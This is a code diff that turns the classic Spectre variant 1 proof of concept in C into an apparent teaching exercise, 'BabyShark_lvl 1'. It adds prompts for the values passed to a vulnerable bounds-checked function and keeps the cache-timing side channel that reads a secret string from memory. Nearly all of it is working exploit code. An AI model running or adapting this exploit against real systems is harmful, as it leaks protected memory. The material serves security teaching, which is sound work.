@@ -33,13 +33,12 @@ uint8_t array1[160] = {
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
 
-// char * secret = "The Magic Words are Sqeamish Ossifraggee";
-char *secret = "Here is a secret!!!!!!!! wow wow wow wow";
+char * secret = "The Magic Words are Sqeamish Ossifraggee";
 
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
-void victim_function(size_t x) {
-  if (x < array1_size) {
+void victim_function(size_t x, size_t y, size_t z) {
+  if (((x < array1_size) & y & ~z)) {
     temp &= array2[array1[x] * 512];
   }
 }
@@ -47,14 +46,15 @@ void victim_function(size_t x) {
 #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
+void readMemoryByte(size_t inputs[6], uint8_t value[2], int score[2]) {
   static int results[256];
   int tries, i, j, k, mix_i, junk = 0;
-  size_t training_x, x;
+  size_t training_x, malicious_x, x;
   register uint64_t time1, time2;
   volatile uint8_t * addr;
   int cpui[4];
 
+  malicious_x = inputs[0];
   for (i = 0; i < 256; i++)
     results[i] = 0;
   for (tries = 999; tries > 0; tries--) {
@@ -66,22 +66,14 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
     training_x = tries % array1_size;
     for (j = 29; j >= 0; j--) {
+        x = inputs[j % 6];
       _mm_clflush( & array1_size);
       for (volatile int z = 0; z < 500; z++) {} /* Delay (can also mfence) */
 
-      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
-      /* Avoid jumps in case those tip off the branch predictor */
-      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
-      x = training_x ^ (x & (malicious_x ^ training_x));
-
-      /* Call the victim! */
-      victim_function(x);
+      victim_function(x, inputs[1], inputs[2]);
 
     }
 
-    // __cpuid(&cpui, 0x80000001);
-    // printf("%d", cpui[3]);
 
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
     for (i = 0; i < 256; i++) {
@@ -124,24 +116,39 @@ int main(int argc,
   size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
   int i, score[2], len = 40;
   uint8_t value[2];
+  size_t x[6] = {0, 0, 0, 0, 0, 0};
+  size_t input_var;
+
+  printf("Welcome to BabyShark_lvl 1\n");
+  printf("In these series of assignments, you will be exploring the Spectre Vulnerability\n");
+  printf("Here, you will choose the values that are passed to the vulnerable  function\n");
+  printf("Enter the first value to be passed to the vulnerable function\n");
+  scanf("%zu", &input_var);
+  x[1] = input_var;
+printf("Enter the second value to be passed to the vulnerable function\n");
+  scanf("%zu", &input_var);
+  x[2] = input_var;   
+printf("Enter the third value to be passed to the vulnerable function\n");
+  scanf("%zu", &input_var);  
+  x[3] = input_var;  
+printf("Enter the fourth value to be passed to the vulnerable function\n");
+  scanf("%zu", &input_var);
+  x[4] = input_var;
+printf("Enter the fifth value to be passed to the vulnerable function\n");  
+  scanf("%zu", &input_var);  
+  x[5] = input_var; 
 
   for (i = 0; i < sizeof(array2); i++)
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
-  if (argc == 3) {
-    sscanf(argv[1], "%p", (void * * )( & malicious_x));
-    malicious_x -= (size_t) array1; /* Convert input value into a pointer */
-    sscanf(argv[2], "%d", & len);
-  }
+
+  x[0] = malicious_x;
 
   printf("Reading %d bytes:\n", len);
   while (--len >= 0) {
     printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
-    readMemoryByte(malicious_x++, value, score);
-    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-    printf("0x%02X=’%c’ score=%d ", value[0],
-      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-    if (score[1] > 0)
-      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
+    readMemoryByte(x, value, score);
+    x[0] += 1;
+    printf("0x%02X=’%c’", value[0], value[0]);
     printf("\n");
   }
   return (0);
